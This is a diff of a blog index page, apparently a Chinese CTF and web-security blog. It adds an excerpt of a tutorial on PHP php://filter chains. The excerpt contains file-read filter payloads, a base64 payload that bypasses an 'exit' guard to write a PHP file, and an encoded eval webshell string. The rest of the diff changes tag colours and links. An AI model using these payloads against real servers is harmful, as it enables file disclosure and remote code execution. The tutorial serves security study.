@@ -285,6 +285,138 @@
 </div>
 
 <div class="post">
+    <a href="/blog/2023/11/24/FilterChain/">
+        <h2 class="post-title">FilterChain</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/24
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 PHP 中，我们可以利用 PHP <code>Base64</code> Filter 宽松的解析，通过 <code>iconv</code>filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8">https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<hr>
+<h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><blockquote>
+<p>php:&#x2F;&#x2F;filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流</p>
+</blockquote>
+<p>我们在<code>php://filter</code><a href="https://c1oudfl0w0.github.io/blog/2023/03/15/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">伪协议</a>的读取文件中曾经出现过下面这些payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>
+php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span>
+php<span class="token punctuation">:</span><span class="token comment">//filter/read=string.rot13/resource=flag.php</span>
+php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span>
+php<span class="token punctuation">:</span><span class="token comment">//filter/convert.iconv.CP9066.CSUCS4/resource=flag.php</span>
+php<span class="token punctuation">:</span><span class="token comment">//filter/convert.iconv.UTF8.CSISO2022KR/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这是为了利用编码来读取一些内容会与解析器出现冲突的文件，比如内容中出现<code>&lt;?php ...?&gt;</code>就会被php解析，或者被xml解析引发冲突导致读取失败</p>
+<p>接下来以我们最常用的base64编码作为展开</p>
+<hr>
+<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64编码字符表如下，编码过后的字符只能在下面范围内选（还包括用于补全的等号<code>=</code>)</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124205857231.png" alt="image-20231124205857231"></p>
+<p>Base64编码是从<code>3-&gt;4</code>的编码，也就是从三个字节变成四个字节的过程，假如编码字符总数不是3的倍数（也可以说编码后的字符串长度不是4的倍数），那么空缺部分会用”&#x3D;”补齐，例：</p>
+<p><code>0w0 -&gt; MHcw</code>，<code>0w0~ -&gt; MHcwfg==</code></p>
+<p>而众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，这是base64的宽松性</p>
+<p>所以，一个正常的<code>base64_decode</code>实际上可以理解为如下两个步骤：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><code>base64_decode</code>只会匹配<code>a-z0-9A-Z\+\/</code>，再算上一个用于补全的<code>=</code>， 这些就是有效字符；而其他字符会自动被忽略，即无效字符</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124212443966.png" alt="image-20231124212443966"></p>
+<hr>
+<h2 id="死亡代码绕过"><a href="#死亡代码绕过" class="headerlink" title="死亡代码绕过"></a>死亡代码绕过</h2><p>我这里也曾经提到过关于<code>file_put_contents</code>函数的<a href="https://c1oudfl0w0.github.io/blog/2023/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81">死亡代码绕过</a></p>
+<p>原型：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span> <span class="token operator">.=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们的目的是写马，就要绕过<code>exit</code>，而绕过的方法在那篇博客也说了，就是利用编码的方式，将死亡代码解码成乱码来绕过</p>
+<p>这里以base64编码来准备我们的payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">txt<span class="token operator">=</span>aPD9waHAgcGhwaW5mbygpOz8<span class="token operator">+</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=1.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拼接后的结果为：<code>&lt;?php exit; ?&gt;aPD9waHAgcGhwaW5mbygpOz8+</code></p>
+<p>而在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124212034479.png" alt="image-20231124212034479"></p>
+<p>而除了base64的编码方式以外，还可以用rot13（未开启短标签时），iconv编码</p>
+<hr>
+<h1 id="Filterchain构造"><a href="#Filterchain构造" class="headerlink" title="Filterchain构造"></a>Filterchain构造</h1><p>我们在上面的php伪协议和死亡代码绕过中都提到了一种<code>convert.iconv</code> 的 Filter，可以用来将数据从字符集 A 转换为字符集 B</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span>
+php<span class="token punctuation">:</span><span class="token comment">//filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)>?/resource=s1mple.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>我们可以在linux环境下进行转换</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124213018986.png" alt="image-20231124213018986"></p>
+<p>其中这两个字符集可以从 <code>iconv -l</code> 获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124213402669.png" alt="image-20231124213402669"></p>
+<p>那么，结合我们上述提到的编码、文件内容，我们是不是可以利用一些固定的文件内容来产生 webshell 呢？</p>
+<p>结合 PHP Base64 宽松性，即使我们使用其他字符编码产生了不可见字符，我们也可以利用 <code>convert.base64-decode</code> 来去掉非法字符，留下我们想要的字符</p>
+<h2 id="双重去杂"><a href="#双重去杂" class="headerlink" title="双重去杂"></a>双重去杂</h2><p>注：需要在linux环境下运行php脚本</p>
+<p>demo：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$content1</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,bbb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$content2</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode/resource=data://,bbb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$content3</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,bbb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$content1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$content1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"=========================================="</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$content2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$content2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"=========================================="</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$content3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$content3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124214911455.png" alt="image-20231124214911455"></p>
+<p>经过从<code>UTF-8-&gt;CSISO2022KR</code>后，bbb变成了七个字节，为什么只显示)Cbbb是因为其余的是不可见字符,16进制解码一下</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231124215527247.png" alt="image-20231124215527247"></p>
+<p>这里就要介绍filter第一个特性了，也就是强制显示（<code>convert.base64-decode</code>的时候忽略了无效字符）</p>
+<p>拿上述输出结果中的第二条数据来看，我们已经看到了第一条输出结果中16进制是什么字符串</p>
+<p>而对于base64来说有效字符只有<code>Cbbb</code>，<code>convert.base64-decode</code>的时候解码出的虽然是乱码，但是只有3个字符，符合 base64 解码<code>4-&gt;3</code>的规则</p>
+<p>现在看第三条，我们只是base64编码了回去，但是此时的输出结果只有4个字节，实现了去除CSISO2022KR的字符，同时还原了一个字符C</p>
+<hr>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/blog/tags/PHP/" style="color: #ff7d73">
+                PHP
+            </a>
+        </span>
+        
+    </div>
+    <a href="/blog/2023/11/24/FilterChain/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/">
         <h2 class="post-title">NSSCTF web 刷题记录3</h2>
     </a>
@@ -324,14 +456,14 @@
         
         <span class="tag">
             
-            <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00bcd4">
+            <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #ff7d73">
                 刷题
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/blog/tags/NSS/" style="color: #ff7d73">
+            <a href="/blog/tags/NSS/" style="color: #ffa2c4">
                 NSS
             </a>
         </span>
@@ -406,7 +538,10 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pop爷的博客：<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/">https://boogipop.com/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p>
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/">https://boogipop.com/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843">https://xz.aliyun.com/t/11843</a></p>
+<p>测试版本：PHP 7.4.3</p>
             
         </div>
     </div>
@@ -419,14 +554,14 @@
         
         <span class="tag">
             
-            <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ffa2c4">
+            <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00bcd4">
                 反序列化
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/blog/tags/PHP/" style="color: #ffa2c4">
+            <a href="/blog/tags/PHP/" style="color: #03a9f4">
                 PHP
             </a>
         </span>
@@ -484,7 +619,7 @@
         
         <span class="tag">
             
-            <a href="/blog/tags/leetcode/" style="color: #ffa2c4">
+            <a href="/blog/tags/leetcode/" style="color: #ff7d73">
                 leetcode
             </a>
         </span>
@@ -535,14 +670,14 @@
         
         <span class="tag">
             
-            <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ff7d73">
+            <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #03a9f4">
                 反序列化
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/blog/tags/ctfshow/" style="color: #00bcd4">
+            <a href="/blog/tags/ctfshow/" style="color: #03a9f4">
                 ctfshow
             </a>
         </span>
@@ -592,7 +727,7 @@
         
         <span class="tag">
             
-            <a href="/blog/tags/PHP/" style="color: #00bcd4">
+            <a href="/blog/tags/PHP/" style="color: #ff7d73">
                 PHP
             </a>
         </span>
@@ -682,46 +817,6 @@
     <a href="/blog/2023/11/09/C%E8%AF%AD%E8%A8%80/" class="go-post">阅读全文</a>
 </div>
 
-<div class="post">
-    <a href="/blog/2023/11/07/gopherus%E5%AE%89%E8%A3%85%E6%97%B6%E6%8A%A5%E9%94%99/">
-        <h2 class="post-title">gopherus安装时报错</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/blog/categories/Q-A/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                Q&amp;A
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/11/7
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h1><p>安装gopherus时，执行<code>./install.sh</code>命令报错：</p>
-<p>&#x2F;usr&#x2F;bin&#x2F;python2：No module named pip</p>
-<p>但是虚拟机中有python2的环境</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-    </div>
-    <a href="/blog/2023/11/07/gopherus%E5%AE%89%E8%A3%85%E6%97%B6%E6%8A%A5%E9%94%99/" class="go-post">阅读全文</a>
-</div>
-
 
             <div class="page-current">
     <div class="prev">
@@ -738,7 +833,7 @@
             
             
             <span class="page-omit">...</span>
-            <a class="page-num" href="/blog/page/19">19</a>
+            <a class="page-num" href="/blog/page/20">20</a>
             
         </span>
         
